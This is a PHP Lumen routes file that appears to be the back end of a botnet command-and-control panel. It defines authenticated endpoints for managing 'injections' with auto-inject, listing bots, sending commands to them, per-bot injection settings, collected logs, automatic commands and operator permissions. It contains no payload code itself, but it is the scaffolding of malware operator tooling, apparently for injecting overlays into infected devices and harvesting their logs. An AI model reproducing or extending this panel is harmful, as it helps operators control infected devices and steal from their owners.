<?php

use App\Helpers\ApiResponse;
use App\Models\AutoCommand;
use App\Models\Bot;
use App\Models\BotCommand;
use App\Services\InjectionsService;
use Carbon\Carbon;
use Laravel\Lumen\Routing\Router;

/*
|--------------------------------------------------------------------------
| Application Routes
|--------------------------------------------------------------------------
|
| Here is where you can register all of the routes for an application.
| It is a breeze. Simply tell Lumen the URIs it should respond to
| and give it the Closure to call when that URI is requested.
|
*/

/** @var Router $router */

$router->get('/', function (): ApiResponse {
    return ApiResponse::error('Not found', 404);
});

$router->group(['prefix' => 'api'], function () use ($router): void {
    $router->post('register', 'AuthController@register');

    $router->post('login', 'AuthController@login');

    $router->group(['middleware' => 'auth'], function () use ($router): void {
        $router->get('me', 'AuthController@me');
        $router->group(['prefix' => 'injections'], function () use ($router): void {
            $router->post('list', [
                'middleware' => 'permission:injections.list',
                'uses' => 'InjectionController@list'
            ]);
            $router->post('create', [
                'middleware' => 'permission:injections.create',
                'uses' => 'InjectionController@create'
            ]);
            $router->post('{injectionId}/edit', [
                'middleware' => 'permission:injections.edit',
                'uses' => 'InjectionController@edit'
            ]);
            $router->delete('delete', [
                'middleware' => 'permission:injections.delete',
                'uses' => 'InjectionController@delete'
            ]);
            $router->put('{injectionId}/changeAutoInject', [
                'middleware' => 'permission:injections.edit',
                'uses' => 'InjectionController@changeAutoInject'
            ]);
        });

        $router->group(['prefix' => 'bots'], function () use ($router): void {
            $router->post('list', ['middleware' => 'permission:bots.list', 'uses' => 'BotController@list']);
            $router->get('filters', 'BotController@filters');
            $router->post('sendCommand', 'BotController@sendCommand');
            $router->delete('delete', [
                'middleware' => 'permission:bots.delete',
                'uses' => 'BotController@delete'
            ]);
            $router->delete('deleteAllRemovedApp', [
                'middleware' => 'permission:bots.delete',
                'uses' => 'BotController@deleteAllRemovedApp'
            ]);

            $router->group(['prefix' => '{botId}'], function () use ($router): void {
                $router->put('setType', 'BotController@setType');

                $router->group(['prefix' => 'commands'], function () use ($router): void {
                    $router->get('list', 'BotCommandController@list');
                });

                $router->group(['prefix' => 'settings'], function () use ($router): void {
                    $router->put('update', 'BotSettingsController@update');
                });

                $router->group(['prefix' => 'injections'], function () use ($router): void {
                    $router->put('update', 'BotInjectionController@update');
                });
            });

            $router->put('editComment', 'BotController@editComment');
        });

        $router->group(['prefix' => 'logs'], function () use ($router): void {
            $router->post('list', 'LogController@list');
            $router->delete('delete', 'LogController@delete');
            $router->put('editComment', 'LogController@editComment');
        });

        $router->group(['prefix' => 'users'], function () use ($router): void {
            $router->post('list', [
                'middleware' => 'permission:users.list',
                'uses' => 'UserController@list'
            ]);
            $router->put('{userId}/edit', [
                'middleware' => 'permission:users.edit',
                'uses' => 'UserController@edit'
            ]);
            $router->delete('{userId}/delete', [
                'middleware' => 'permission:users.delete',
                'uses' => 'UserController@delete'
            ]);
            $router->post('create', [
                'middleware' => 'permission:users.create',
                'uses' => 'UserController@create'
            ]);
        });

        $router->group(['prefix' => 'permissions'], function () use ($router): void {
            $router->put('update', [
                'middleware' => 'permission:permissions.change',
                'uses' => 'PermissionController@update'
            ]);

            $router->post('list', [
                'middleware' => 'permission:permissions.list',
                'uses' => 'PermissionController@list'
            ]);
        });

        $router->group(['prefix' => 'counts'], function () use ($router): void {
            $router->post('list', 'CountController@list');
        });

        $router->group(['prefix' => 'stats'], function () use ($router): void {
            $router->post('list', 'StatsController@list');
        });

        $router->group(['prefix' => 'auto_commands'], function () use ($router): void {
            $router->post('list', [
                'middleware' => 'permission:autoCommands.list',
                'uses' => 'AutoCommandsController@list'
            ]);

            $router->put('update', [
                'middleware' => 'permission:autoCommands.edit',
                'uses' => 'AutoCommandsController@update'
            ]);

            $router->put('updateEnabled', [
                'middleware' => 'permission:autoCommands.edit',
                'uses' => 'AutoCommandsController@updateEnabled'
            ]);
        });
    });
});
